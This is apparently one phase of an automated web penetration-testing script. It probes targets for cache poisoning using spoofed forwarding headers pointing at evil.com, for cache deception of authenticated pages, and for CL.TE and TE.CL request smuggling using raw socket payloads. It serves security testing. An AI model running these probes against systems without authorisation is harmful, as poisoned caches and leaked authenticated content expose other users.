**Phase 29 — Web Cache Poisoning / Deception & Request Smuggling**

  Tests for web cache poisoning via unkeyed headers, web cache deception via path confusion,
  and basic HTTP request smuggling detection (CL.TE / TE.CL). Caching infrastructure is
  fingerprinted first, then poisoning and deception attacks are attempted.

  ```python
  import time, json, re, random, string
  from urllib.parse import urljoin, urlparse

  BASE        = _G['BASE']
  SESSION_DIR = _G['SESSION_DIR']
  session     = _G.get('session_a') or _G.get('session')
  ALL_LINKS   = _G.get('ALL_LINKS', set())
  AUTH_PAGES  = _G.get('AUTH_PAGES', {})

  cache_findings = []

  print('='*60)
  print('PHASE 29 — WEB CACHE POISONING / DECEPTION')
  print('='*60)

  # ══════════════════════════════════════════════════════════════
  # PART A — Cache Detection & Fingerprinting
  # ══════════════════════════════════════════════════════════════
  CACHE_HEADERS = ['X-Cache', 'X-Cache-Hits', 'Age', 'Via', 'CF-Cache-Status',
                   'X-Varnish', 'X-Fastly-Request-ID', 'X-Served-By',
                   'X-CDN', 'X-Edge-IP', 'X-Akamai-Transformed',
                   'X-Cache-Status', 'X-Proxy-Cache', 'Surrogate-Control']

  cache_detected = False
  cache_info = {}

  # Send two requests to detect caching behavior
  try:
      buster = ''.join(random.choices(string.ascii_lowercase, k=8))
      r1 = session.get(BASE, timeout=10)
      time.sleep(1)
      r2 = session.get(BASE, timeout=10)

      for hdr in CACHE_HEADERS:
          val1 = r1.headers.get(hdr, '')
          val2 = r2.headers.get(hdr, '')
          if val1 or val2:
              cache_detected = True
              cache_info[hdr] = val2 or val1
              print(f"  [CACHE] {hdr}: {val2 or val1}")

      # Check Cache-Control
      cc = r1.headers.get('Cache-Control', '')
      if cc:
          cache_info['Cache-Control'] = cc
          print(f"  [CACHE] Cache-Control: {cc}")
          if 'public' in cc or 'max-age' in cc:
              cache_detected = True

      # Check Age header progression
      age1 = r1.headers.get('Age', '')
      age2 = r2.headers.get('Age', '')
      if age1 and age2:
          print(f"  [CACHE] Age header: {age1} -> {age2} (caching confirmed)")
          cache_detected = True

      if cache_detected:
          print(f"\n  [INFO] Caching infrastructure detected: {json.dumps(cache_info, indent=2)}")
      else:
          print("  [INFO] No obvious caching headers found — testing anyway (cache may be transparent)")
  except Exception as e:
      print(f"  [ERROR] Cache detection failed: {e}")

  # ══════════════════════════════════════════════════════════════
  # PART B — Web Cache Poisoning via Unkeyed Headers
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print("PART B — WEB CACHE POISONING (UNKEYED HEADERS)")
  print('='*60)

  POISON_CANARY = 'cachepoisontest' + ''.join(random.choices(string.ascii_lowercase, k=6))

  # Unkeyed headers to test
  UNKEYED_HEADERS = [
      ('X-Forwarded-Host', f'{POISON_CANARY}.evil.com'),
      ('X-Forwarded-Scheme', 'http'),
      ('X-Forwarded-Proto', 'http'),
      ('X-Original-URL', f'/{POISON_CANARY}'),
      ('X-Rewrite-URL', f'/{POISON_CANARY}'),
      ('X-Forwarded-Port', '1337'),
      ('X-Host', f'{POISON_CANARY}.evil.com'),
      ('X-Forwarded-Server', f'{POISON_CANARY}.evil.com'),
      ('X-HTTP-Method-Override', 'PUT'),
      ('X-Original-Host', f'{POISON_CANARY}.evil.com'),
      ('Forwarded', f'host={POISON_CANARY}.evil.com'),
      ('X-Custom-IP-Authorization', '127.0.0.1'),
      ('X-Forwarded-For', '127.0.0.1'),
      ('True-Client-IP', '127.0.0.1'),
  ]

  # Test pages — use cacheable pages (static-ish URLs)
  test_pages = [BASE]
  for link in list(ALL_LINKS)[:20]:
      parsed = urlparse(link)
      if not parsed.query and parsed.path not in ('/', ''):
          test_pages.append(link if link.startswith('http') else urljoin(BASE, link))
  test_pages = list(set(test_pages))[:10]

  for page_url in test_pages:
      for header_name, header_value in UNKEYED_HEADERS:
          # Use a cache buster to get a fresh entry, then poison it
          buster = ''.join(random.choices(string.ascii_lowercase, k=6))
          # Some caches key on query string, so we can use it as a per-test isolator
          poison_url = f"{page_url}{'&' if '?' in page_url else '?'}cb={buster}"

          try:
              # Step 1: Send poisoned request
              poison_headers = {header_name: header_value}
              r_poison = session.get(poison_url, headers=poison_headers, timeout=10, allow_redirects=False)

              # Check if the header value is reflected in the response
              reflected = False
              if POISON_CANARY in r_poison.text:
                  reflected = True
              elif header_name in ('X-Forwarded-Scheme', 'X-Forwarded-Proto') and 'http://' in r_poison.text:
                  # Check for HTTP downgrade in links/redirects
                  r_clean_check = session.get(page_url, timeout=10, allow_redirects=False)
                  if 'https://' in r_clean_check.text and 'http://' not in r_clean_check.text:
                      reflected = True
              elif header_name == 'X-Forwarded-Port' and '1337' in r_poison.text:
                  reflected = True

              if not reflected:
                  continue

              # Step 2: Check if poison is cached — send clean request to same URL
              time.sleep(1)
              r_clean = session.get(poison_url, timeout=10, allow_redirects=False)

              if POISON_CANARY in r_clean.text or \
                 (header_name == 'X-Forwarded-Port' and '1337' in r_clean.text):
                  print(f"  [CRITICAL] Cache poisoning CONFIRMED: {header_name} at {page_url}")
                  print(f"    Poisoned response served to clean request!")
                  cache_findings.append({
                      'url': page_url, 'type': 'cache-poisoning',
                      'header': header_name, 'value': header_value,
                      'desc': f"Cache poisoning via '{header_name}: {header_value}' — poisoned response served to clean requests",
                  })
                  break  # One confirmed header per page is enough
              else:
                  print(f"  [INFO] {header_name} reflected but NOT cached at {page_url}")
          except:
              continue

  if not any(f['type'] == 'cache-poisoning' for f in cache_findings):
      print("  [OK] No cache poisoning found via unkeyed headers")

  # ══════════════════════════════════════════════════════════════
  # PART C — Web Cache Deception
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print("PART C — WEB CACHE DECEPTION")
  print('='*60)

  STATIC_EXTENSIONS = ['.css', '.js', '.png', '.gif', '.ico', '.svg',
                       '.jpg', '.jpeg', '.woff', '.woff2', '.ttf']

  # Test authenticated pages for cache deception
  auth_urls = list(AUTH_PAGES.keys()) if AUTH_PAGES else []
  # Also test common authenticated paths
  common_auth_paths = ['/account', '/profile', '/settings', '/dashboard',
                       '/user', '/me', '/api/user', '/api/me', '/api/profile']
  for path in common_auth_paths:
      full = urljoin(BASE, path)
      if full not in auth_urls:
          auth_urls.append(full)

  deception_findings = []

  if auth_urls and session:
      print(f"[WCD] Testing {len(auth_urls)} authenticated pages for cache deception")
      for auth_url in auth_urls[:10]:
          url = auth_url if auth_url.startswith('http') else urljoin(BASE, auth_url)

          # Get authenticated response first
          try:
              r_auth = session.get(url, timeout=10)
              if r_auth.status_code != 200:
                  continue
              # Look for sensitive content markers
              auth_markers = ['email', 'username', 'name', 'account', 'balance',
                              'token', 'api_key', 'phone', 'address', 'ssn']
              has_sensitive = any(m in r_auth.text.lower() for m in auth_markers)
              if not has_sensitive:
                  continue
              auth_body_snippet = r_auth.text[:500]
          except:
              continue

          # Test path confusion with static extensions
          for ext in STATIC_EXTENSIONS:
              buster = ''.join(random.choices(string.ascii_lowercase, k=6))
              # Path confusion: /account/settings/nonexistent.css
              deception_url = f"{url.rstrip('/')}/nonexistent_{buster}{ext}"

              try:
                  # Step 1: Request with auth (should cache the authenticated response)
                  r_cached = session.get(deception_url, timeout=10)
                  if r_cached.status_code != 200:
                      continue

                  # Check if the authenticated content is returned for the .css/.js URL
                  if not any(m in r_cached.text.lower() for m in auth_markers):
                      continue

                  # Step 2: Request WITHOUT auth (if cached, we get the auth'd content)
                  time.sleep(1)
                  import requests as _req
                  unauth_session = _req.Session()
                  unauth_session.verify = False
                  r_unauth = unauth_session.get(deception_url, timeout=10)

                  if r_unauth.status_code == 200:
                      # Check if the unauthenticated response contains authenticated content
                      for marker in auth_markers:
                          if marker in r_unauth.text.lower() and marker in r_cached.text.lower():
                              print(f"  [CRITICAL] Cache deception CONFIRMED: {deception_url}")
                              print(f"    Unauthenticated request returns authenticated content!")
                              deception_findings.append({
                                  'url': url, 'type': 'cache-deception',
                                  'deception_url': deception_url,
                                  'extension': ext,
                                  'desc': f"Authenticated content cached at {deception_url} — accessible without auth",
                              })
                              break
                      if deception_findings and deception_findings[-1].get('url') == url:
                          break
              except:
                  continue
  else:
      print("[WCD] No authenticated pages or session available for cache deception testing")

  cache_findings.extend(deception_findings)

  if not deception_findings:
      print("  [OK] No cache deception found")

  # ══════════════════════════════════════════════════════════════
  # PART D — Basic Request Smuggling Detection
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print("PART D — REQUEST SMUGGLING (BASIC DETECTION)")
  print('='*60)
  print("  [NOTE] Running safe detection only — no destructive payloads")

  smuggling_findings = []

  # Test CL.TE — Content-Length is processed by frontend, Transfer-Encoding by backend
  # Safe probe: if the server handles the conflict differently, response timing will differ
  try:
      import socket, ssl

      parsed = urlparse(BASE)
      host = parsed.hostname
      port = parsed.port or (443 if parsed.scheme == 'https' else 80)
      use_ssl = parsed.scheme == 'https'

      def send_raw(payload, timeout=10):
          """Send raw HTTP request and measure response time."""
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.settimeout(timeout)
          if use_ssl:
              ctx = ssl.create_default_context()
              ctx.check_hostname = False
              ctx.verify_mode = ssl.CERT_NONE
              s = ctx.wrap_socket(s, server_hostname=host)
          s.connect((host, port))
          s.sendall(payload)
          start = time.time()
          try:
              resp = s.recv(65535)
              elapsed = time.time() - start
          except socket.timeout:
              elapsed = timeout
              resp = b''
          s.close()
          return resp, elapsed

      # CL.TE detection: send Content-Length that covers full body, but include TE header
      # If backend uses TE, it will wait for chunk termination -> timeout difference
      path = parsed.path or '/'

      # Baseline timing
      baseline_payload = (
          f"POST {path} HTTP/1.1\r\n"
          f"Host: {host}\r\n"
          f"Content-Type: application/x-www-form-urlencoded\r\n"
          f"Content-Length: 4\r\n"
          f"\r\n"
          f"x=1\r\n"
      ).encode()
      _, baseline_time = send_raw(baseline_payload)
      print(f"  [INFO] Baseline response time: {baseline_time:.2f}s")

      # CL.TE probe
      clte_payload = (
          f"POST {path} HTTP/1.1\r\n"
          f"Host: {host}\r\n"
          f"Content-Type: application/x-www-form-urlencoded\r\n"
          f"Content-Length: 4\r\n"
          f"Transfer-Encoding: chunked\r\n"
          f"\r\n"
          f"1\r\n"
          f"Z\r\n"
          f"Q\r\n"
      ).encode()
      _, clte_time = send_raw(clte_payload)
      print(f"  [INFO] CL.TE probe response time: {clte_time:.2f}s")

      if clte_time > baseline_time + 5:
          print(f"  [HIGH] CL.TE smuggling likely — response delayed by {clte_time - baseline_time:.1f}s")
          smuggling_findings.append({
              'url': BASE, 'type': 'clte-smuggling',
              'desc': f"CL.TE discrepancy detected — {clte_time:.1f}s vs {baseline_time:.1f}s baseline",
          })

      # TE.CL probe
      tecl_payload = (
          f"POST {path} HTTP/1.1\r\n"
          f"Host: {host}\r\n"
          f"Content-Type: application/x-www-form-urlencoded\r\n"
          f"Content-Length: 100\r\n"
          f"Transfer-Encoding: chunked\r\n"
          f"\r\n"
          f"0\r\n"
          f"\r\n"
      ).encode()
      _, tecl_time = send_raw(tecl_payload)
      print(f"  [INFO] TE.CL probe response time: {tecl_time:.2f}s")

      if tecl_time > baseline_time + 5:
          print(f"  [HIGH] TE.CL smuggling likely — response delayed by {tecl_time - baseline_time:.1f}s")
          smuggling_findings.append({
              'url': BASE, 'type': 'tecl-smuggling',
              'desc': f"TE.CL discrepancy detected — {tecl_time:.1f}s vs {baseline_time:.1f}s baseline",
          })

      # Transfer-Encoding obfuscation variants
      te_variants = [
          'Transfer-Encoding: xchunked',
          'Transfer-Encoding : chunked',
          'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
          'Transfer-Encoding:\tchunked',
          'Transfer-Encoding: chunked\x00',
          'X: ignored\r\nTransfer-Encoding: chunked',
      ]
      for variant in te_variants:
          try:
              obf_payload = (
                  f"POST {path} HTTP/1.1\r\n"
                  f"Host: {host}\r\n"
                  f"Content-Type: application/x-www-form-urlencoded\r\n"
                  f"Content-Length: 4\r\n"
                  f"{variant}\r\n"
                  f"\r\n"
                  f"1\r\n"
                  f"Z\r\n"
                  f"Q\r\n"
              ).encode()
              _, obf_time = send_raw(obf_payload, timeout=10)
              if obf_time > baseline_time + 5:
                  print(f"  [HIGH] TE obfuscation accepted: '{variant.split(chr(13))[0]}' — delayed {obf_time:.1f}s")
                  smuggling_findings.append({
                      'url': BASE, 'type': 'te-obfuscation-smuggling',
                      'desc': f"TE obfuscation variant accepted and caused delay: {variant.split(chr(13))[0]}",
                  })
                  break
          except:
              continue

      if not smuggling_findings:
          print("  [OK] No request smuggling indicators found")

  except Exception as e:
      print(f"  [ERROR] Smuggling detection failed: {e}")
      print("  [NOTE] Raw socket tests may not work through all proxy configurations")

  cache_findings.extend(smuggling_findings)

  # ══════════════════════════════════════════════════════════════
  # SUMMARY
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*60}")
  print(f"PHASE 29 SUMMARY: {len(cache_findings)} issues found")
  print('='*60)

  for f in cache_findings:
      if f['type'] in ('cache-poisoning', 'cache-deception'):
          sev = 'CRITICAL'
      elif f['type'] in ('clte-smuggling', 'tecl-smuggling', 'te-obfuscation-smuggling'):
          sev = 'HIGH'
      else:
          sev = 'MEDIUM'
      print(f"  [{sev}] {f['type']}: {f.get('url','')} — {f.get('desc','')}")

  if cache_findings:
      for f in cache_findings:
          if f['type'] in ('cache-poisoning', 'cache-deception'):
              sev = 'CRITICAL'
          elif f['type'] in ('clte-smuggling', 'tecl-smuggling', 'te-obfuscation-smuggling'):
              sev = 'HIGH'
          else:
              sev = 'MEDIUM'

          title_map = {
              'cache-poisoning': 'Web Cache Poisoning',
              'cache-deception': 'Web Cache Deception',
              'clte-smuggling': 'Request Smuggling',
              'tecl-smuggling': 'Request Smuggling',
              'te-obfuscation-smuggling': 'Request Smuggling',
          }

          _G.setdefault('FINDINGS', []).append({
              'severity': sev,
              'title': title_map.get(f['type'], 'Cache Poisoning'),
              'url': f.get('url', ''),
              'method': 'GET',
              'evidence': f.get('desc', ''),
              'impact': {
                  'cache-poisoning': 'Serve malicious content to all users via poisoned cache, XSS at scale, phishing',
                  'cache-deception': 'Steal authenticated user data (PII, tokens, session data) from cached responses',
                  'clte-smuggling': 'Bypass security controls, hijack other users requests, cache poisoning, credential theft',
                  'tecl-smuggling': 'Bypass security controls, hijack other users requests, cache poisoning, credential theft',
                  'te-obfuscation-smuggling': 'Bypass security controls via TE header obfuscation, request hijacking',
              }.get(f['type'], 'Cache manipulation and data exposure'),
              'screenshot': '',
              'detail': f,
          })

  # POST-PHASE SCREENSHOT CHECKPOINT
  print("\n[SCREENSHOT CHECKPOINT] Verify cache poisoning / deception / smuggling findings:")
  for finding in _G.get('FINDINGS', []):
      if finding.get('title') in ('Web Cache Poisoning', 'Web Cache Deception', 'Request Smuggling'):
          if not finding.get('screenshot'):
              safe_name = re.sub(r'[^\w]', '_', finding.get('title', ''))[:30].lower()
              print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
              print(f"    URL: {finding.get('url')}")
              print(f"    browser_action(action='screenshot', filename='phase_29_{safe_name}.png')")
  ```
